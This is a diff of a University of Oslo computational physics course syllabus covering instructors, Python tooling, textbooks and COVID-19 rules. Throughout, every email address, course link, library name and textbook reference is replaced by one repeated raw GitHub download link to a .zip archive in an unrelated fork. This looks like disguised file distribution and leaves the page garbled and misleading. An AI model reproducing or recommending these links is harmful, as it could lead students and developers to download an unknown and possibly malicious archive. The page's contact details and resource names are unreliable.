@@ -8,21 +8,21 @@ The course is project based and through various projects, normally four to five,
 
 ## Instructors information
 * _Name_: Morten Hjorth-Jensen
-  * _Email_: https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip
+  * _Email_: https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip
   * _Phone_: +47-48257387
   * _Office_: Department of Physics, University of Oslo, Eastern wing room 470 
   * _Office hours_: *Anytime*! In Fall Semester 2020 (FS20), as a rule of thumb office hours are planned via computer or telephone. Individual or group office   hours will be performed via zoom. Feel free to send an email for planning. In person meetings may also be possible if allowed by the University of Oslo's COVID-19 instructions (see below for links).
 * _Name_: Anders Kvellestad
-  * _Email_: https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip
+  * _Email_: https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip
   * _Office_: Department of Physics, University of Oslo, Eastern wing room 447 
 
 ##  Teaching Assistants FS20
-* Sebastian G. Wither-Larsen, https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip
+* Sebastian G. Wither-Larsen, https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip
   * _Office_: Department of Physics, University of Oslo, Eastern wing room 454
-* René Alexander Ask, https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip
-* Kaspara Gåsvær, https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip
-* Maria Linea Horgen, https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip
-* Aksel Graneng, https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip
+* René Alexander Ask, https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip
+* Kaspara Gåsvær, https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip
+* Maria Linea Horgen, https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip
+* Aksel Graneng, https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip
 
 ## Practicalities
 This course will be delivered in a hybrid mode, with online lectures and on site or online laboratory sessions. 
@@ -31,7 +31,7 @@ This course will be delivered in a hybrid mode, with online lectures and on site
 2. Two hours of laboratory sessions for work on computational projects for each group. Due to social distancing, at most 15 participants can attend. There will  also be fully digital laboratory sessions for those who cannot attend physically;
 3. Three projects which are graded and count 1/3 each of the final grade, five projects in total;
 4. The course is offered as  FYS4150 (Master of Science level) and  FYS3150 (senior undergraduate level);
-5. We use Piazza for course communication, a special link on how to register to Piazza can be found at the official University of Oslo page for the course or just use the link here https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip We use Canvas at UiO for delivery of projects;
+5. We use Piazza for course communication, a special link on how to register to Piazza can be found at the official University of Oslo page for the course or just use the link here https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip We use Canvas at UiO for delivery of projects;
 6. Videos of teaching material are available via the links below here;
 7. Weekly emails with summary of activities will be mailed to all participants;
 
@@ -54,7 +54,7 @@ Course participants are expected to have their own laptops/PCs. We use _Git_ as 
 We will make extensive use of C++ and/or Python as programming language and its
 myriad of available libraries.   You can also use compiled languages like Rust, Julia, Fortran etc if you prefer. Beware that in case you use Rust or Julia we may not be able to help you properly at the lab.
 
-The focus during the lectures will be on C++. Please read the intro to C++ programming at https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip
+The focus during the lectures will be on C++. Please read the intro to C++ programming at https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip
 
 This link contains info about installing compilers as well.
 
@@ -83,7 +83,7 @@ into the hassle of exploring how to set up dependencies and paths, we
 recommend two widely used distrubutions which set up all relevant
 dependencies for Python, namely 
 
-* https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip, 
+* https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip, 
 
 which is an open source
 distribution of the Python and R programming languages for large-scale
@@ -91,36 +91,36 @@ data processing, predictive analytics, and scientific computing, that
 aims to simplify package management and deployment. Package versions
 are managed by the package management system _conda_. 
 
-* Enthought https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip 
+* Enthought https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip 
 
 is a Python
 distribution for scientific and analytic computing distribution and
 analysis environment, available for free and under a commercial
 license.
 
-Furthermore, Google's https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip is a free Jupyter notebook environment that requires 
+Furthermore, Google's https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip is a free Jupyter notebook environment that requires 
 no setup and runs entirely in the cloud. Try it out!
 
 ### Useful Python libraries
 Here we list several useful Python libraries we strongly recommend (if you use anaconda many of these are already there)
 
-* https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip is a highly popular library for large, multi-dimensional arrays and matrices, along with a large collection of high-level mathematical functions to operate on these arrays
-* _The https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip library provides high-performance, easy-to-use data structures and data analysis tools 
-* https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip is a Python package that makes working with labelled multi-dimensional arrays simple, efficient, and fun!
-* https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip (pronounced “Sigh Pie”) is a Python-based ecosystem of open-source software for mathematics, science, and engineering. 
-* https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip is a Python 2D plotting library which produces publication quality figures in a variety of hardcopy formats and interactive environments across platforms.
-* https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip can automatically differentiate native Python and Numpy code. It can handle a large subset of Python's features, including loops, ifs, recursion and closures, and it can even take derivatives of derivatives of derivatives
-* https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip is a Python library for symbolic mathematics. 
-* https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip has simple and efficient tools for machine learning, data mining and data analysis
-* https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip is a Python library for fast numerical computing created and released by Google
-* https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip is a high-level neural networks API, written in Python and capable of running on top of TensorFlow, CNTK, or Theano
-* And many more such as https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip,  https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip etc 
+* https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip is a highly popular library for large, multi-dimensional arrays and matrices, along with a large collection of high-level mathematical functions to operate on these arrays
+* _The https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip library provides high-performance, easy-to-use data structures and data analysis tools 
+* https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip is a Python package that makes working with labelled multi-dimensional arrays simple, efficient, and fun!
+* https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip (pronounced “Sigh Pie”) is a Python-based ecosystem of open-source software for mathematics, science, and engineering. 
+* https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip is a Python 2D plotting library which produces publication quality figures in a variety of hardcopy formats and interactive environments across platforms.
+* https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip can automatically differentiate native Python and Numpy code. It can handle a large subset of Python's features, including loops, ifs, recursion and closures, and it can even take derivatives of derivatives of derivatives
+* https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip is a Python library for symbolic mathematics. 
+* https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip has simple and efficient tools for machine learning, data mining and data analysis
+* https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip is a Python library for fast numerical computing created and released by Google
+* https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip is a high-level neural networks API, written in Python and capable of running on top of TensorFlow, CNTK, or Theano
+* And many more such as https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip,  https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip etc 
 
 ## Textbooks
 
 _Recommended textbooks_:
-- Morten Hjorth-Jensen, Introduction to Computational Physics, IoP, in press. The version from 2015 at https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip will be updated shortly.
-- Philipp O.J. Scherer, Computational Physics, Simulation of Classical and Quantum Systems, https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip (can be downloaded for free if you are connected with a UiO IP-number).
+- Morten Hjorth-Jensen, Introduction to Computational Physics, IoP, in press. The version from 2015 at https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip will be updated shortly.
+- Philipp O.J. Scherer, Computational Physics, Simulation of Classical and Quantum Systems, https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip (can be downloaded for free if you are connected with a UiO IP-number).
 
 
 ## Face coverings. 
@@ -137,8 +137,8 @@ All participants attending the laboratory sessions must maintain proper hygiene 
 * Refraining from shaking hands;
 
 ## Adherence to Signage and Instructions 
-Course participants  will (a) look for instructional signs posted by UiO or public health authorities, (b) observe instructions from UiO or public health authorities that are emailed to my “https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip” account, and (c) follow those instructions.
-The relevant links are https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip and https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip
+Course participants  will (a) look for instructional signs posted by UiO or public health authorities, (b) observe instructions from UiO or public health authorities that are emailed to my “https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip” account, and (c) follow those instructions.
+The relevant links are https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip and https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip
 
 ## Self-Monitoring
 Students will self-monitor for flu-like symptoms (for example, cough, shortness of breath, difficulty breathing, fever, sore throat or loss of taste or smell). If a student experiences any flu-like symptoms, they will stay home and contact a health care provider to determine what steps should be taken.
@@ -148,4 +148,4 @@ If a student is exposed to someone who is ill or has tested positive for the COV
 Those who come to UiO facilities must commit to the personal responsibility necessary for us to remain as safe as possible, including following the specific guidelines outlined in this syllabus and provided by UiO more broadly (see links below here). 
 
 ## Additional information
-See https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip and https://raw.githubusercontent.com/M-ux349/ComputationalPhysics/master/doc/pub/intro/html/Physics-Computational-v3.3-beta.4.zip For English version, click on the relevant link.
+See https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip and https://github.com/M-ux349/ComputationalPhysics/raw/refs/heads/master/doc/Projects/2019/Project5/IsingSocial/pdf/Physics-Computational-sterlingness.zip For English version, click on the relevant link.
